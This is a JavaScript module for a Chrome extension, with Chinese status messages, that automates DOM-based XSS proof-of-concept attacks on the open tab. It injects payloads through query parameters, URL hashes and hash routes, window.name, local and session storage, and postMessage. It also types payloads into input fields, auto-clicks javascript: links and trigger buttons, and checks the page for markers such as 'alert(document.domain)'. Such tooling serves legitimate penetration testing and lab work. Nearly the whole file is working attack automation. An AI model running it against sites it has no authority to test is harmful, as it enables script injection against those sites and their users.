export function createPocTriggerService(options = {}) {
  const chromeApi = options.chromeApi || chrome;
  const domxssAssist = options.domxssAssist || {};
  const buildDomxssAssistContext = domxssAssist.buildDomxssAssistContext || (() => ({}));
  const pickXssPayload = domxssAssist.pickXssPayload || (() => '');
  const dedupePayloadCandidates = domxssAssist.dedupePayloadCandidates || ((items = []) => items);
  const collectLikelyQueryParams = domxssAssist.collectLikelyQueryParams || (() => []);
  const isHrefLikeSink = domxssAssist.isHrefLikeSink || (() => false);
  const buildHashRouteCandidates = domxssAssist.buildHashRouteCandidates || (() => []);

async function inspectPayloadFlow(tabId, payload = '') {
  try {
    const [res] = await chromeApi.scripting.executeScript({
      target: { tabId },
      func: (injectedPayload) => {
        const payloadText = String(injectedPayload || '');
        const markerMatch = payloadText.match(/DOM_PROBE_[A-Z0-9]{3,8}/i);
        const marker = markerMatch?.[0] || '';
        const html = document.documentElement?.innerHTML || '';
        const lesson = document.querySelector('.lesson-content');
        const lessonHtml = lesson?.innerHTML || '';
        const indicators = [payloadText, marker, 'alert(document.domain)', '<svg', 'onload=alert', 'data-se='];
        const textHit = indicators.some((token) => token && (lessonHtml.includes(token) || html.includes(token)));
        const domProbeHit = marker
          ? Boolean(document.querySelector(`domprobe[data-se="${marker}"],[data-se="${marker}"]`))
          : false;
        const hit = textHit || domProbeHit;
        return {
          hit,
          url: location.href,
          hash: location.hash,
          lessonSnippet: lessonHtml.slice(0, 1200),
          marker
        };
      },
      args: [payload]
    });
    return res?.result || { hit: false, url: '', hash: '', lessonSnippet: '', marker: '' };
  } catch {
    return { hit: false, url: '', hash: '', lessonSnippet: '', marker: '' };
  }
}
function sleep(ms = 0) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
function waitForTabLoadComplete(tabId, timeoutMs = 7000) {
  return new Promise((resolve) => {
    let resolved = false;
    const done = (loaded) => {
      if (resolved) return;
      resolved = true;
      clearTimeout(timer);
      chromeApi.tabs.onUpdated.removeListener(onUpdated);
      resolve(loaded);
    };
    const onUpdated = (updatedTabId, changeInfo) => {
      if (updatedTabId === tabId && changeInfo.status === 'complete') {
        done(true);
      }
    };
    const timer = setTimeout(() => done(false), timeoutMs);
    chromeApi.tabs.onUpdated.addListener(onUpdated);
    chromeApi.tabs.get(tabId).then((tab) => {
      if (tab?.status === 'complete') {
        done(true);
      }
    }).catch(() => {});
  });
}
async function tryAutoClickInjectedLink(tabId, payload = '') {
  try {
    await waitForTabLoadComplete(tabId, 7000);
    const clickLinkScript = async () => {
      const [res] = await chromeApi.scripting.executeScript({
        target: { tabId },
        func: (injectedPayload) => {
          const payloadText = String(injectedPayload || '').trim().toLowerCase();
          const links = Array.from(document.querySelectorAll('#dom a[href], #dom a, a[href]'));
          const selected = links.find((el) => {
            const href = String(el.getAttribute('href') || '').trim().toLowerCase();
            if (!href) return false;
            if (href.startsWith('javascript:')) return true;
            if (payloadText && href.includes(payloadText)) return true;
            return false;
          });
          if (!selected) {
            return { clicked: false, reason: '未发现候选利用链接' };
          }
          selected.click();
          return {
            clicked: true,
            href: selected.getAttribute('href') || '',
            text: (selected.textContent || '').trim().slice(0, 80)
          };
        },
        args: [payload]
      });
      return res?.result || { clicked: false, reason: '点击脚本无返回' };
    };

    const triggerScript = async () => {
      const [res] = await chromeApi.scripting.executeScript({
        target: { tabId },
        func: (injectedPayload) => {
          const payloadText = String(injectedPayload || '');
          const inputCandidates = Array.from(document.querySelectorAll('input[type="text"],input[type="search"],input:not([type]),textarea'));
          const input = inputCandidates.find((el) => {
            const text = `${el.id || ''} ${el.name || ''} ${el.placeholder || ''}`.toLowerCase();
            return /xss|text|query|search|keyword|payload|content|message/.test(text);
          }) || inputCandidates[0];
          if (input) {
            input.value = payloadText;
            input.dispatchEvent(new Event('input', { bubbles: true }));
            input.dispatchEvent(new Event('change', { bubbles: true }));
          }

          const triggers = Array.from(document.querySelectorAll('a[onclick],button,input[type="button"],input[type="submit"],a[role="button"]'));
          const strongTrigger = triggers.find((el) => {
            const text = `${el.textContent || ''} ${el.value || ''} ${el.id || ''} ${el.name || ''} ${el.getAttribute('onclick') || ''}`.toLowerCase();
            return /domxss|xss|payload|render|decode|执行|触发/.test(text);
          });
          const trigger = strongTrigger || triggers.find((el) => {
            const text = `${el.textContent || ''} ${el.value || ''} ${el.id || ''} ${el.name || ''} ${el.getAttribute('onclick') || ''}`.toLowerCase();
            return /submit|search|query|run|show|test|go|click|trigger|提交|查询|触发|说出|执行/.test(text);
          });
          if (!trigger) {
            return { triggered: false, reason: '未找到触发控件' };
          }
          trigger.click();
          return {
            triggered: true,
            trigger: (trigger.textContent || trigger.value || trigger.id || trigger.name || 'unknown trigger').trim().slice(0, 80)
          };
        },
        args: [payload]
      });
      return res?.result || { triggered: false, reason: '触发脚本无返回' };
    };

    const directClick = await clickLinkScript();
    if (directClick.clicked) {
      return directClick;
    }

    const triggerResult = await triggerScript().catch((error) => ({
      triggered: true,
      reason: error?.message || 'trigger script interrupted'
    }));
    if (!triggerResult?.triggered) {
      return { clicked: false, reason: triggerResult?.reason || '未完成触发动作', trigger: '' };
    }

    await waitForTabLoadComplete(tabId, 7000);
    const secondClick = await clickLinkScript();
    if (secondClick.clicked) {
      return { ...secondClick, trigger: triggerResult.trigger || '' };
    }
    return {
      clicked: false,
      reason: secondClick.reason || '触发后仍未命中利用链接',
      trigger: triggerResult.trigger || ''
    };
  } catch (error) {
    return { clicked: false, reason: error?.message || '自动点击失败' };
  }
}
async function triggerXssPocOnTab(tabId, report = {}) {
  const tab = await chromeApi.tabs.get(tabId);
  const currentUrl = tab?.url || '';
  if (!currentUrl || currentUrl.startsWith('chrome://') || currentUrl.startsWith('edge://')) {
    throw new Error('当前页面不支持脚本注入或URL改写');
  }

  const sourcePoint = String(report.sourcePoint || '').toLowerCase();
  const isDomInputSource = (
    sourcePoint.includes('dom input value') ||
    sourcePoint.includes('event target value') ||
    sourcePoint.includes('jquery val()') ||
    sourcePoint.includes('input value') ||
    sourcePoint.includes('.value')
  );
  const assistContext = buildDomxssAssistContext(report, currentUrl);
  const payload = String(assistContext.payload || '').trim() || pickXssPayload(report);
  const payloadReason = String(assistContext.payloadReason || '').trim();
  const payloadProfile = String(assistContext.payloadProfile || '').trim();
  const exploitPayload = String(assistContext.exploitPayload || '').trim();
  const exploitReason = String(assistContext.exploitReason || '').trim();
  const exploitPayloadCandidates = dedupePayloadCandidates(assistContext.exploitPayloadCandidates || []);
  const likelyQueryParams = collectLikelyQueryParams(report, currentUrl);
  const hrefLike = isHrefLikeSink(report);
  let currentHash = '';
  try {
    currentHash = decodeURIComponent((new URL(currentUrl)).hash.replace(/^#/, ''));
  } catch {
    currentHash = (new URL(currentUrl)).hash.replace(/^#/, '');
  }
  const hashParts = currentHash.split('/').filter(Boolean);
  const looksLikeHashRoute = hashParts.length >= 1 && !currentHash.includes('=');
  const buildPocResult = ({ status = '', method = '', url = currentUrl, message = '', details = null } = {}) => {
    const result = {
      success: true,
      status,
      method,
      payload,
      payloadReason,
      payloadProfile,
      exploitPayload,
      exploitReason,
      exploitPayloadCandidates,
      url,
      message
    };
    if (details && Object.keys(details).length) {
      result.details = details;
    }
    return result;
  };

  const buildAutoClickMessage = (autoClickResult) => {
    if (!hrefLike) return '';
    if (autoClickResult?.clicked) {
      const triggerText = autoClickResult.trigger ? `, 触发控件: ${autoClickResult.trigger}` : '';
      return ` 已自动点击候选链接(${autoClickResult.href || 'unknown href'}${triggerText})，请查看是否触发。`;
    }
    const triggerText = autoClickResult?.trigger ? `, 已尝试触发: ${autoClickResult.trigger}` : '';
    return ` 自动点击未命中(${autoClickResult?.reason || 'unknown'}${triggerText})，可手工点击页面链接验证。`;
  };
  const resolveFunctionNameFromChain = () => {
    const chain = String(report.sourceSinkChain || '');
    const match = chain.match(/->\s*\[L\d+\]\s*([A-Za-z_$][\w$]*)\s*:/);
    return match?.[1] || '';
  };
  const invokeLikelyHandlersInPage = async (targetUrl = '') => {
    const fnName = resolveFunctionNameFromChain();
    const [res] = await chromeApi.scripting.executeScript({
      target: { tabId },
      world: 'MAIN',
      func: (urlToSet, sourceFnName) => {
        const called = [];
        try {
          if (urlToSet) {
            history.replaceState({}, '', urlToSet);
          }
        } catch {}
        const tryCall = (name) => {
          try {
            if (name && typeof window[name] === 'function') {
              window[name]();
              called.push(`window.${name}()`);
            }
          } catch {}
        };
        tryCall(sourceFnName || '');
        tryCall('domxss');

        if (!called.length) {
          const submit = document.querySelector('form button[type="submit"],form input[type="submit"]');
          if (submit && typeof submit.click === 'function') {
            submit.click();
            called.push('form submit click');
          }
        }
        return {
          called,
          href: location.href
        };
      },
      args: [targetUrl, fnName]
    });
    await sleep(280);
    return res?.result || { called: [], href: currentUrl };
  };
  const fillInputAndTrigger = async () => {
    const chain = String(report.sourceSinkChain || '');
    const idMatch = chain.match(/getElementById\(\s*['"`]([^'"`]+)['"`]\s*\)\s*\.value/i);
    const nameMatch = chain.match(/getElementsByName\(\s*['"`]([^'"`]+)['"`]\s*\)\s*(?:\[[^\]]+\])?\s*\.value/i);
    const selectorMatch = chain.match(/querySelector(?:All)?\(\s*['"`]([^'"`]+)['"`]\s*\)\s*(?:\[[^\]]+\])?\s*\.value/i);
    const hints = {
      id: idMatch?.[1] || '',
      name: nameMatch?.[1] || '',
      selector: selectorMatch?.[1] || ''
    };
    const fnName = (() => {
      const match = chain.match(/->\s*\[L\d+\]\s*([A-Za-z_$][\w$]*)\s*:/);
      return match?.[1] || '';
    })();

    const [res] = await chromeApi.scripting.executeScript({
      target: { tabId },
      world: 'MAIN',
      func: (injectedPayload, injectedHints, injectedFnName) => {
        const payloadText = String(injectedPayload || '');
        const hints = injectedHints || {};
        const inputCandidates = [];

        if (hints.id) {
          const byId = document.getElementById(String(hints.id));
          if (byId) inputCandidates.push(byId);
        }
        if (hints.name) {
          const byName = Array.from(document.getElementsByName(String(hints.name)) || []);
          byName.forEach((el) => inputCandidates.push(el));
        }
        if (hints.selector) {
          try {
            const bySelector = Array.from(document.querySelectorAll(String(hints.selector)) || []);
            bySelector.forEach((el) => inputCandidates.push(el));
          } catch {}
        }
        Array.from(document.querySelectorAll('input,textarea,select')).forEach((el) => inputCandidates.push(el));

        const uniq = [];
        const seen = new Set();
        inputCandidates.forEach((el) => {
          if (!el || seen.has(el)) return;
          seen.add(el);
          uniq.push(el);
        });
        const editable = uniq.filter((el) => {
          if (!(el instanceof Element)) return false;
          const tag = el.tagName.toLowerCase();
          if (tag === 'textarea' || tag === 'select') return true;
          if (tag !== 'input') return false;
          const type = String(el.getAttribute('type') || 'text').toLowerCase();
          return !['hidden', 'submit', 'button', 'checkbox', 'radio', 'file', 'image', 'reset'].includes(type);
        }).slice(0, 3);

        editable.forEach((el) => {
          try {
            el.focus?.();
            el.value = payloadText;
            el.setAttribute?.('value', payloadText);
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
          } catch {}
        });

        let trigger = '';
        const clickables = Array.from(document.querySelectorAll('button,input[type="button"],input[type="submit"],a[onclick],*[onclick]'));
        const targetTrigger = clickables.find((el) => {
          const text = `${el.textContent || ''} ${el.id || ''} ${el.name || ''} ${el.getAttribute('value') || ''} ${el.getAttribute('onclick') || ''}`.toLowerCase();
          return /xss|domxss|click|submit|run|go|test|trigger|执行|触发/.test(text);
        }) || clickables[0];
        if (targetTrigger && typeof targetTrigger.click === 'function') {
          targetTrigger.click();
          trigger = (targetTrigger.textContent || targetTrigger.getAttribute('value') || targetTrigger.id || targetTrigger.name || 'click trigger').toString().trim();
        }

        if (!trigger && injectedFnName && typeof window[injectedFnName] === 'function') {
          try {
            window[injectedFnName]();
            trigger = `window.${injectedFnName}()`;
          } catch {}
        }

        return {
          typedCount: editable.length,
          trigger: trigger || 'none',
          url: location.href
        };
      },
      args: [payload, hints, fnName]
    });
    await sleep(420);
    return res?.result || { typedCount: 0, trigger: 'none', url: currentUrl };
  };

  const updateHash = async () => {
    const targetUrl = new URL(currentUrl);
    const hashParam = likelyQueryParams[0] || 'xss';
    targetUrl.hash = `${hashParam}=${encodeURIComponent(payload)}`;
    await chromeApi.tabs.update(tabId, { url: targetUrl.toString() });
    const autoClickResult = hrefLike ? await tryAutoClickInjectedLink(tabId, payload) : null;
    return buildPocResult({
      status: '已跳转并注入hash',
      method: 'location.hash',
      url: targetUrl.toString(),
      message: `请观察页面是否将 hash 写入危险 sink 并执行。${buildAutoClickMessage(autoClickResult)}`.trim()
    });
  };
  const updateHashRoute = async () => {
    const targetUrl = new URL(currentUrl);
    let decodedHash = '';
    try {
      decodedHash = decodeURIComponent(targetUrl.hash.replace(/^#/, ''));
    } catch {
      decodedHash = targetUrl.hash.replace(/^#/, '');
    }
    const routeParts = decodedHash.split('/').filter(Boolean);
    const routeName = routeParts[0] || 'test';
    if (routeParts.length >= 2) {
      routeParts[routeParts.length - 1] = encodeURIComponent(payload);
      targetUrl.hash = routeParts.join('/');
    } else {
      targetUrl.hash = `${routeName}/${encodeURIComponent(payload)}`;
    }

    await chromeApi.tabs.update(tabId, { url: targetUrl.toString() });
    const autoClickResult = hrefLike ? await tryAutoClickInjectedLink(tabId, payload) : null;
    return buildPocResult({
      status: '已跳转并注入hash路由参数',
      method: 'hash-route',
      url: targetUrl.toString(),
      message: `请观察页面是否将 hash 路由参数写入危险 sink 并执行。${buildAutoClickMessage(autoClickResult)}`.trim()
    });
  };
  const tryHashRouteCandidates = async () => {
    const candidates = buildHashRouteCandidates(currentUrl, report, payload);
    if (!candidates.length) return null;
    for (const candidate of candidates) {
      const targetUrl = new URL(currentUrl);
      targetUrl.search = '';
      targetUrl.hash = candidate.hash;
      await chromeApi.tabs.update(tabId, { url: targetUrl.toString() });
      await waitForTabLoadComplete(tabId, 7000);
      await sleep(380);
      const inspect = await inspectPayloadFlow(tabId, payload);
      if (inspect.hit) {
        const autoClickResult = hrefLike ? await tryAutoClickInjectedLink(tabId, payload) : null;
        return buildPocResult({
          status: '已命中hash路由注入',
          method: candidate.method,
          url: inspect.url || targetUrl.toString(),
          message: `候选: ${candidate.note}，检测到 payload 已进入页面。${buildAutoClickMessage(autoClickResult)}`.trim(),
          details: {
            hash: inspect.hash || targetUrl.hash,
            lessonSnippet: inspect.lessonSnippet || ''
          }
        });
      }
    }
    const last = candidates[candidates.length - 1];
    const fallbackUrl = new URL(currentUrl);
    fallbackUrl.search = '';
    fallbackUrl.hash = last.hash;
    await chromeApi.tabs.update(tabId, { url: fallbackUrl.toString() });
    return buildPocResult({
      status: '已尝试hash路由注入(未确认命中)',
      method: 'hash-route-candidates',
      url: fallbackUrl.toString(),
      message: `已尝试 ${candidates.length} 个 hash-route 候选，暂未检测到明确 sink 命中，请手工观察页面。`
    });
  };

  const updateQuery = async (includeHashFallback = false) => {
    const targetUrl = new URL(currentUrl);
    const usedParams = likelyQueryParams.slice(0, 3);
    usedParams.forEach((paramName) => {
      targetUrl.searchParams.set(paramName, payload);
    });
    if (includeHashFallback) {
      const hashParam = usedParams[0] || 'xss';
      targetUrl.hash = `${hashParam}=${encodeURIComponent(payload)}`;
    }
    await chromeApi.tabs.update(tabId, { url: targetUrl.toString() });
    const autoClickResult = hrefLike ? await tryAutoClickInjectedLink(tabId, payload) : null;
    return buildPocResult({
      status: '已跳转并注入query',
      method: 'location.search/query',
      url: targetUrl.toString(),
      message: `已注入参数: ${usedParams.join(', ')}${includeHashFallback ? '（并附带hash兜底）' : ''}。请观察页面是否读取 query 并流入 sink。${buildAutoClickMessage(autoClickResult)}`.trim()
    });
  };

  if (isDomInputSource) {
    const fillResult = await fillInputAndTrigger();
    const inspect = await inspectPayloadFlow(tabId, payload);
    const autoClickResult = hrefLike ? await tryAutoClickInjectedLink(tabId, payload) : null;
    const status = (inspect.hit || autoClickResult?.clicked)
      ? '已完成输入注入并触发（检测到命中）'
      : '已完成输入注入并触发（待人工确认）';
    return buildPocResult({
      status,
      method: 'dom-input',
      url: inspect.url || fillResult.url || currentUrl,
      message: `已写入输入控件 ${fillResult.typedCount || 0} 个，触发动作: ${fillResult.trigger || 'none'}。${buildAutoClickMessage(autoClickResult)}`.trim(),
      details: {
        hash: inspect.hash || '',
        lessonSnippet: inspect.lessonSnippet || ''
      }
    });
  }

  if (sourcePoint.includes('location.search') || sourcePoint.includes('route.params') || sourcePoint.includes('query')) {
    const targetUrl = new URL(currentUrl);
    const usedParams = likelyQueryParams.slice(0, 3);
    usedParams.forEach((paramName) => {
      targetUrl.searchParams.set(paramName, payload);
    });
    const invokeResult = await invokeLikelyHandlersInPage(targetUrl.toString());
    const inspect = await inspectPayloadFlow(tabId, payload);
    if (inspect.hit) {
      const autoClickResult = hrefLike ? await tryAutoClickInjectedLink(tabId, payload) : null;
      return buildPocResult({
        status: '已在当前页注入query并触发处理函数',
        method: 'query-inpage-invoke',
        url: inspect.url || invokeResult.href || targetUrl.toString(),
        message: `已注入参数: ${usedParams.join(', ')}，触发动作: ${(invokeResult.called || []).join(', ') || 'none'}。${buildAutoClickMessage(autoClickResult)}`.trim(),
        details: {
          hash: inspect.hash || '',
          lessonSnippet: inspect.lessonSnippet || ''
        }
      });
    }
    return await updateQuery();
  }

  if (sourcePoint.includes('location.hash')) {
    if (looksLikeHashRoute) {
      return await updateHashRoute();
    }
    return await updateHash();
  }

  if (sourcePoint.includes('route') || sourcePoint.includes('function argument')) {
    const routeAttempt = await tryHashRouteCandidates();
    if (routeAttempt) return routeAttempt;
    if (looksLikeHashRoute) {
      return await updateHashRoute();
    }
    return await updateQuery(true);
  }

  if (sourcePoint.includes('window.name')) {
    await chromeApi.scripting.executeScript({
      target: { tabId },
      func: (injectedPayload) => {
        window.name = injectedPayload;
        location.reload();
      },
      args: [payload]
    });
    return buildPocResult({
      status: '已设置 window.name 并刷新',
      method: 'window.name',
      url: currentUrl,
      message: '请观察页面是否读取 window.name 并执行。'
    });
  }

  if (sourcePoint.includes('storage')) {
    await chromeApi.scripting.executeScript({
      target: { tabId },
      func: (injectedPayload) => {
        const keys = ['xss', 'payload', 'content', 'message'];
        keys.forEach(key => {
          localStorage.setItem(key, injectedPayload);
          sessionStorage.setItem(key, injectedPayload);
        });
        location.reload();
      },
      args: [payload]
    });
    return buildPocResult({
      status: '已写入 localStorage/sessionStorage 并刷新',
      method: 'storage',
      url: currentUrl,
      message: '请观察页面读取 storage 后是否触发 sink。'
    });
  }

  if (sourcePoint.includes('postmessage')) {
    await chromeApi.scripting.executeScript({
      target: { tabId },
      func: (injectedPayload) => {
        window.postMessage({ xss: injectedPayload, payload: injectedPayload }, '*');
      },
      args: [payload]
    });
    return buildPocResult({
      status: '已发送 postMessage',
      method: 'postMessage',
      url: currentUrl,
      message: '请观察页面 message 事件处理逻辑是否将数据写入 sink。'
    });
  }

  if (looksLikeHashRoute) {
    return await updateHashRoute();
  }
  if (likelyQueryParams.length > 0) {
    return await updateQuery(true);
  }
  return await updateHash();
}
  return {
    inspectPayloadFlow,
    sleep,
    waitForTabLoadComplete,
    tryAutoClickInjectedLink,
    triggerXssPocOnTab
  };
}
